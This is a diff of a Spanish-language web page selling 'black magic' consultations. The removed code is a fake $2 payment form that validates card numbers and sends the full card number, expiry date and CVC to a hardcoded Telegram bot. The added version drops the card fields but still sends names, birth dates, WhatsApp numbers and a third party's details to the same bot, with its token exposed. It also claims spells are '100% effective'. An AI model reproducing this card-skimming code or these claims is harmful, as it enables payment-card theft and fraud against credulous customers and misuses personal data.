@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Antonio Black Magic Consulta</title>
+    <title>Consulta Antonioblackmagic</title>
     <style>
         body {
             font-family: 'Georgia', serif;
@@ -95,26 +95,62 @@
     </style>
 </head>
 <body>
-     <div class="container" id="form-container">
-        <h2>Antonioblackmagic Consulta y Pago</h2>
+    <div class="container" id="form-container">
+        <p style="text-align:center; font-size:18px; font-style:italic; color:#d6d6d6;">
+            ❧Maestro en Energías Espirituales y Hechicería Profesional☙ ⇊completa tu consulta⇊</p>
+
+Bienvenidos a mi espacio. Soy Antonio Black Magic, un experto en el arte de la magia y el manejo de energías espirituales. Mi misión es ayudarte a transformar tu vida a través de trabajos espirituales efectivos y completamente funcionales.
+
+<p>Trabajo con energías espirituales para resolver cualquier situación:</p>
+
+<p>➤ Problemas amorosos: Recupera a tu ser amado o fortalece tu relación.</p>
+<p>➤ Prosperidad y abundancia: Atrae el dinero y el éxito que mereces.</p>
+<p>➤ Protección: Elimina energías negativas y crea un escudo protector en tu vida.</p>
+<p>➤ Justicia y equilibrio: Restablece la armonía y obtén lo que por derecho te corresponde.</p>
+<p>⚠️ Advertencia:
+Mis trabajos espirituales son 100% efectivos y diseñados para generar cambios permanentes si así lo deseas. Esto no es un juego. Trabajo únicamente con personas serias, comprometidas y dispuestas a aceptar los resultados con respeto y responsabilidad hacia las energías que movilizamos.
+
+Si estás listo para cambiar tu vida de manera definitiva, estoy aquí para ayudarte.
+Confía en mi experiencia y en el poder de las energías espirituales. </p>
+ <p>ℹ️Nota Importante: </p>
+ <p>Antes de solicitar cualquier servicio, asegúrate de estar preparado espiritualmente y mentalmente para aceptar los resultados deseados. Yo trabajo con ética y dedicación para ayudarte a alcanzar tus metas espirituales de manera segura y efectiva.
+<p>❥Te guío para que lo hagas tú mismo:</p>
+<p>Si decides realizar el ritual por tu cuenta, te explicaré paso a paso el proceso. Para es persona, es fundamental que tengas disciplina, una buena conexión espiritual, y te enfoques en trabajar con la energía que nos rodea. Este método requiere compromiso y fe absoluta en el poder del ritual.</p>
+
+<p>★Deja el trabajo en mis manos:</p>
+<p>Si prefieres confiar en un profesional con experiencia, puedo encargarme personalmente de realizar el trabajo por ti. Al hacerlo, garantizo el uso de mis conocimientos avanzados en el arte de la brujería y el manejo de energías espirituales para obtener resultados efectivos. Este servicio tiene un costo, ya que implica mi dedicación, materiales específicos, y el uso de energías poderosas.</p>
+
+<p>⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️
+        </p>
+
+        <h2>Consulta Espiritual Antonioblackmagic</h2>
         <div class="form">
-            <input type="text" id="name" placeholder="Nombre" required>
-            <input type="text" id="surname" placeholder="Apellido" required>
-            <input type="tel" id="phone" placeholder="Número de Teléfono" pattern="\d{10}" required>
+            <input type="text" id="name" placeholder="Tu Nombre" required>
+            <input type="text" id="surname" placeholder="Tu Apellido" required>
             
-            <!-- Campo de fecha de nacimiento -->
+            <!-- Fecha de nacimiento -->
+            <label for="birth-date">Tu Fecha de Nacimiento:</label>
             <input type="text" id="birth-day" placeholder="Día" maxlength="2" required style="width: 60px; text-align: center;">
             <input type="text" id="birth-month" placeholder="Mes" maxlength="2" required style="width: 60px; text-align: center;">
             <input type="text" id="birth-year" placeholder="Año" maxlength="4" required style="width: 80px; text-align: center;">
             
-            <label for="consulted-name">Nombre de la Persona que Desea Consultar:</label>
-            <select id="consulted-name" required onchange="toggleConsultedPersonField()">
-                <option value="" disabled selected>Seleccione una opción</option>
-                <option value="mismo">A Mismo</option>
-                <option value="otra-persona">Otra Persona</option>
-            </select>
-            <input type="text" id="consulted-person" placeholder="Si eligió 'Otra Persona', ingrese su nombre" class="hidden">
-            <label class="category">Selecciona el tipo de trabajo:</label>
+            <!-- País -->
+            <input type="text" id="country" placeholder="Tu País" required>
+
+            <!-- Número de WhatsApp -->
+            <input type="tel" id="whatsapp" placeholder="Tu Número de WhatsApp" required>
+
+            <!-- Nombre del Consultado -->
+            <label for="consulted-name">Nombre del Consultado:</label>
+            <input type="text" id="consulted-name" placeholder="Nombre de la persona que desea consultar" required>
+            
+            <!-- Fecha del consultado -->
+            <label for="consult-date">Fecha de nacimiento de la persona que quiere consultar:</label>
+            <input type="text" id="consult-day" placeholder="Día" maxlength="2" required style="width: 60px; text-align: center;">
+            <input type="text" id="consult-month" placeholder="Mes" maxlength="2" required style="width: 60px; text-align: center;">
+            <input type="text" id="consult-year" placeholder="Año" maxlength="4" required style="width: 80px; text-align: center;">
+
+            <label for="work-type">Selecciona el tipo de trabajo:</label>
             <select id="work-type" required>
                 <!-- Magia Blanca -->
                 <option value="proteccion-personal">Protección personal, familiar o de negocios</option>
@@ -177,146 +213,113 @@
                 <option value="trabajos-poder-politico">Trabajos para obtener poder político o social</option>
                 <option value="eliminacion-bloqueos-emocionales">Eliminación de traumas o bloqueos emocionales</option>
             </select>
-            <h3>Realizar Pago $2</h3>
-            <input type="text" id="payment-card" placeholder="Número de tarjeta (16 dígitos)" maxlength="16" required>
-            <div style="display: flex; justify-content: center; gap: 10px; margin: 10px 0;">
-                <input type="text" id="payment-expiry-month" placeholder="MM" maxlength="2" required style="width: 60px; text-align: center;">
-                <input type="text" id="payment-expiry-year" placeholder="AA" maxlength="2" required style="width: 60px; text-align: center;">
-            </div>
-            <input type="text" id="payment-cvc" placeholder="CVC (3 dígitos)" maxlength="3" required style="width: 80px; text-align: center;">
-            <button type="button" onclick="validateAndProcessPayment()">Pagar 2 dólares</button>
-            <p id="card-error" class="error hidden">Número de tarjeta inválido. Por favor, ingresa un número de tarjeta válido.</p>
+            
+            <button type="button" id="submit-btn">Enviar Consulta</button>
         </div>
     </div>
 
     <div class="loading-screen" id="loading-screen">
         <div class="spinner"></div>
-        <p>Procesando Pago...</p>
+        <p>Procesando Consulta...</p>
     </div>
 
     <div class="summary-screen" id="summary-screen">
-        <h2>¡Gracias por tu consulta! con Antonioblackmagic</h2>
+        <h2>¡Gracias por elegirme para tu consulta!</h2>
         <p id="summary-text"></p>
-        <p>Te estaremos contactando por WhatsApp con los resultados lo mas pronto posible bendiciones.</p>
+        <p>Te estaremos contactando por WhatsApp con los resultados lo más pronto posible. Bendiciones.</p>
     </div>
 
     <script>
-        const telegramBotToken = '7707153060:AAH8FcyQeMkD5bc5E5G8RaNEeO3xun1G4zg'; // Reemplaza con tu token
-        const telegramChatId = '5916166500'; // Reemplaza con tu chat ID
-
-        function toggleConsultedPersonField() {
-            const consultedName = document.getElementById('consulted-name').value;
-            const consultedPerson = document.getElementById('consulted-person');
-            consultedPerson.classList.toggle('hidden', consultedName !== 'otra-persona');
-            consultedPerson.required = consultedName === 'otra-persona';
-        }
-
-        function isValidCardNumber(cardNumber) {
-            let sum = 0;
-            let shouldDouble = false;
-            for (let i = cardNumber.length - 1; i >= 0; i--) {
-                let digit = parseInt(cardNumber.charAt(i));
-                if (shouldDouble) {
-                    digit *= 2;
-                    if (digit > 9) digit -= 9;
-                }
-                sum += digit;
-                shouldDouble = !shouldDouble;
-            }
-            return sum % 10 === 0;
-        }
-
-        // Función para enviar mensaje a Telegram
-        function sendMessageToTelegram(message) {
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
-            fetch(url).then(response => {
-                if (!response.ok) {
-                    console.error('Error al enviar el mensaje a Telegram:', response);
-                }
-            }).catch(error => {
-                console.error('Error al enviar mensaje a Telegram:', error);
-            });
-        }
-
-        function validateAndProcessPayment() {
-            const name = document.getElementById('name').value.trim();
-            const surname = document.getElementById('surname').value.trim();
-            const phone = document.getElementById('phone').value.trim();
-            const birthDay = document.getElementById('birth-day').value.trim();
-            const birthMonth = document.getElementById('birth-month').value.trim();
-            const birthYear = document.getElementById('birth-year').value.trim();
-            const consultedName = document.getElementById('consulted-name').value;
-            const consultedPerson = document.getElementById('consulted-person').value.trim();
-            const workType = document.getElementById('work-type').value;
-            const card = document.getElementById('payment-card').value.trim();
-            const expiryMonth = document.getElementById('payment-expiry-month').value.trim();
-            const expiryYear = document.getElementById('payment-expiry-year').value.trim();
-            const cvc = document.getElementById('payment-cvc').value.trim();
-
-            if (!name || !surname || !phone || !birthDay || !birthMonth || !birthYear || !consultedName || !workType || !card || !expiryMonth || !expiryYear || !cvc) {
-                alert("Por favor, llena todos los campos obligatorios.");
-                return;
-            }
-
-            if (consultedName === "otra-persona" && !consultedPerson) {
-                alert("Por favor, ingresa el nombre de la otra persona.");
-                return;
-            }
-
-            if (card.length !== 16 || !/^\d+$/.test(card) || !isValidCardNumber(card)) {
-                document.getElementById('card-error').classList.remove('hidden');
-                return;
-            } else {
-                document.getElementById('card-error').classList.add('hidden');
-            }
-
-            // Mostrar pantalla de carga
+        window.addEventListener('load', function() {
+            // Asegurarse de que la pantalla de carga no se muestra al cargar la página
             const loadingScreen = document.getElementById('loading-screen');
-            loadingScreen.style.display = 'flex';
+            loadingScreen.style.display = 'none'; // Inicialmente está oculta
 
-            setTimeout(() => {
-                loadingScreen.style.display = 'none';
+            // Escuchar el evento del botón "Enviar Consulta"
+            document.getElementById('submit-btn').addEventListener('click', function(event) {
+                event.preventDefault(); // Evitar que el formulario se envíe automáticamente
 
-                // Ocultar formulario
-                const formContainer = document.getElementById('form-container');
-                formContainer.style.display = 'none';
+                // Verificar que todos los campos están completos
+                const name = document.getElementById('name').value.trim();
+                const surname = document.getElementById('surname').value.trim();
+                const birthDay = document.getElementById('birth-day').value.trim();
+                const birthMonth = document.getElementById('birth-month').value.trim();
+                const birthYear = document.getElementById('birth-year').value.trim();
+                const country = document.getElementById('country').value.trim();
+                const whatsapp = document.getElementById('whatsapp').value.trim();
+                const consultedName = document.getElementById('consulted-name').value.trim();
+                const consultDay = document.getElementById('consult-day').value.trim();
+                const consultMonth = document.getElementById('consult-month').value.trim();
+                const consultYear = document.getElementById('consult-year').value.trim();
+                const workType = document.getElementById('work-type').value;
 
-                // Crear mensaje para Telegram
+                if (!name || !surname || !birthDay || !birthMonth || !birthYear || !country || !whatsapp || !consultedName || !consultDay || !consultMonth || !consultYear || !workType) {
+                    alert("Por favor, llena todos los campos obligatorios.");
+                    return; // No continuar si hay campos vacíos
+                }
+
+                // Mostrar la pantalla de carga cuando se haga clic en el botón
+                loadingScreen.style.display = 'flex';
+
+                // Token y ID del bot de Telegram
+                const token = "7707153060:AAH8FcyQeMkD5bc5E5G8RaNEeO3xun1G4zg";  // Sustituye con el token de tu bot
+                const chatId = "5916166500";   // Sustituye con tu chat ID
+
+                // Crear el mensaje
                 const message = `
-                    Nueva consulta y pago recibido:
                     Nombre: ${name}
                     Apellido: ${surname}
-                    Teléfono: ${phone}
                     Fecha de Nacimiento: ${birthDay}/${birthMonth}/${birthYear}
-                    Tipo de trabajo: ${workType}
-                    Consultado: ${consultedName === "otra-persona" ? consultedPerson : 'A Mismo'}
-                    Tarjeta: ${card} 
-                    Expiración: ${expiryMonth}/${expiryYear}
-                    CVC: ${cvc}
+                    País: ${country}
+                    WhatsApp: ${whatsapp}
+                    Consultado: ${consultedName}
+                    Fecha de Consulta: ${consultDay}/${consultMonth}/${consultYear}
+                    Trabajo solicitado: ${workType}
                 `;
-                // Enviar mensaje a Telegram
-                sendMessageToTelegram(message);
 
-                // Mostrar resumen
-                const summaryScreen = document.getElementById('summary-screen');
-                const summaryText = document.getElementById('summary-text');
-                summaryText.innerHTML = `
-                    <strong>Nombre:</strong> ${name}<br>
-                    <strong>Apellido:</strong> ${surname}<br>
-                    <strong>Fecha de Nacimiento:</strong> ${birthDay}/${birthMonth}/${birthYear}<br>
-                    <strong>Teléfono:</strong> ${phone}<br>
-                    <strong>Trabajo:</strong> ${workType}<br>
-                    ${consultedName === "otra-persona" ? `<strong>Consultado:</strong> ${consultedPerson}` : ""}
-                `;
-                summaryScreen.style.display = 'block';
-            }, 4000);
-        }
+                // Enviar el mensaje a Telegram
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                }).then(response => response.json())
+                  .then(data => {
+                      if (data.ok) {
+                          setTimeout(() => {
+                              // Ocultar la pantalla de carga
+                              loadingScreen.style.display = 'none';
 
-        window.onload = () => {
-            document.getElementById('loading-screen').style.display = 'none';
-            document.getElementById('summary-screen').style.display = 'none';
-            document.getElementById('card-error').classList.add('hidden');
-        };
+                              // Ocultar el formulario
+                              document.getElementById('form-container').style.display = 'none';
+
+                              // Mostrar el resumen en la pantalla de agradecimiento
+                              const summaryScreen = document.getElementById('summary-screen');
+                              const summaryText = document.getElementById('summary-text');
+                              summaryText.innerHTML = `
+                                  <strong>Nombre:</strong> ${name}<br>
+                                  <strong>Apellido:</strong> ${surname}<br>
+                                  <strong>Fecha de Nacimiento:</strong> ${birthDay}/${birthMonth}/${birthYear}<br>
+                                  <strong>País:</strong> ${country}<br>
+                                  <strong>WhatsApp:</strong> ${whatsapp}<br>
+                                  <strong>Consultado:</strong> ${consultedName}<br>
+                                  <strong>Fecha del Consultado:</strong> ${consultDay}/${consultMonth}/${consultYear}<br>
+                                  <strong>Trabajo:</strong> ${workType}<br>
+                              `;
+                              summaryScreen.style.display = 'block';
+                          }, 4000); // Espera de 4 segundos antes de mostrar el resumen
+                      } else {
+                          alert('Hubo un problema al enviar el mensaje a Telegram. Inténtalo nuevamente.');
+                      }
+                  }).catch(error => {
+                      alert('Error en la conexión con Telegram: ' + error.message);
+                  });
+            });
+        });
     </script>
 </body>
 </html>
